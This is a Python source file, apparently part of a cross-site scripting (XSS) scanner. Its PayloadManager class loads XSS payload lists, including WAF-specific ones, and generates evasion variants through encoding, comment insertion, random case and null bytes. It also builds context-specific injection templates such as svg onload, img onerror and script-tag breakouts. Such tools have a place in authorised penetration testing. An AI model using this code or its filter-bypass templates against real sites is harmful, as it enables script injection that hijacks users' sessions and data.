import random
import re
from urllib.parse import quote
from config.constants import DEFAULT_PAYLOADS, ERROR, RESET, WAF_PAYLOAD_DIR
import os

class PayloadManager:
    def __init__(self, payload_file=None, waf_type=None, context_aware=True):
        self.payload_file = payload_file or DEFAULT_PAYLOADS['default']
        self.waf_type = waf_type
        self.context_aware = context_aware
        self.payloads = []
        self.smart_payloads = []
    
    async def load_payloads(self):
        """Load XSS payloads from the specified file and generate smart variants."""
        try:
            # Cargar payloads base
            with open(self.payload_file, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
            
            # Si se especificó un WAF, cargar payloads adicionales
            if self.waf_type:
                waf_file = os.path.join(WAF_PAYLOAD_DIR, f"{self.waf_type.lower()}.txt")
                if os.path.exists(waf_file):
                    with open(waf_file, 'r', encoding='utf-8') as f:
                        self.payloads.extend([line.strip() for line in f if line.strip()])
            
            # Generar payloads inteligentes
            if self.context_aware:
                self._generate_smart_payloads()
            
            return list(set(self.payloads + self.smart_payloads))  # Eliminar duplicados
            
        except FileNotFoundError:
            print(f"{ERROR}🚨 Payload file not found: {self.payload_file}{RESET}")
            return []
        except Exception as e:
            print(f"{ERROR}🚨 Error reading payload file: {e}{RESET}")
            return []
    
    def _generate_smart_payloads(self):
        """Generate context-aware and WAF-bypass payload variants."""
        for payload in self.payloads[:50]:  # Limitar para no generar demasiados
            # Variantes básicas
            self.smart_payloads.extend(self._generate_encoding_variants(payload))
            self.smart_payloads.extend(self._generate_obfuscation_variants(payload))
            
            # Variantes específicas de contexto
            contexts = ['html', 'attribute', 'script', 'javascript']
            for context in contexts:
                self.smart_payloads.append(self._get_context_aware_payload(payload, context))
    
    def _generate_encoding_variants(self, payload):
        """Generate different encoding variants of a payload."""
        variants = []
        
        # URL encoding
        variants.append(quote(payload))
        variants.append(quote(payload.replace(' ', '/')))
        
        # HTML encoding
        variants.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        # Hex encoding
        hex_payload = ''.join([f'\\x{ord(c):02x}' for c in payload])
        variants.append(hex_payload)
        
        return variants
    
    def _generate_obfuscation_variants(self, payload):
        """Generate obfuscated variants of a payload."""
        variants = []
        
        # Concatenación de strings
        if 'alert' in payload:
            variants.append(payload.replace('alert', 'al' + 'ert'))
        
        # Comentarios
        variants.append(payload.replace(' ', '/**/'))
        variants.append(payload.replace('=', '=/*x*/'))
        
        # Random case
        variants.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
        
        # Null bytes
        variants.append(payload.replace(' ', '%00'))
        
        return variants
    
    def _get_context_aware_payload(self, base_payload, context):
        """Generate context-aware payload based on injection context."""
        if context == 'html':
            return random.choice([
                f'"><svg/onload={base_payload}>',
                f'<img src=x onerror={base_payload}>',
                f'<script>{base_payload}</script>'
            ])
        elif context == 'attribute':
            return random.choice([
                f'" autofocus onfocus={base_payload} x="',
                f'javascript:{base_payload}',
                f' onmouseover={base_payload} x='
            ])
        elif context == 'script':
            return random.choice([
                f';{base_payload}//',
                f'</script><svg/onload={base_payload}>',
                f'{{}})({base_payload})//'
            ])
        elif context == 'javascript':
            return random.choice([
                f'`${base_payload}`',
                f'${{{base_payload}}}',
                f'({base_payload})()'
            ])
        return base_payload
    
    def get_encoded_payload(self, payload):
        """Get URL-encoded version of the payload."""
        return quote(payload)
    
    def get_waf_bypass_payloads(self, waf_type):
        """Get specialized payloads for bypassing specific WAFs."""
        waf_file = os.path.join(WAF_PAYLOAD_DIR, f"{waf_type.lower()}.txt")
        if os.path.exists(waf_file):
            try:
                with open(waf_file, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception:
                pass
        return self.payloads  # Fallback to default payloads
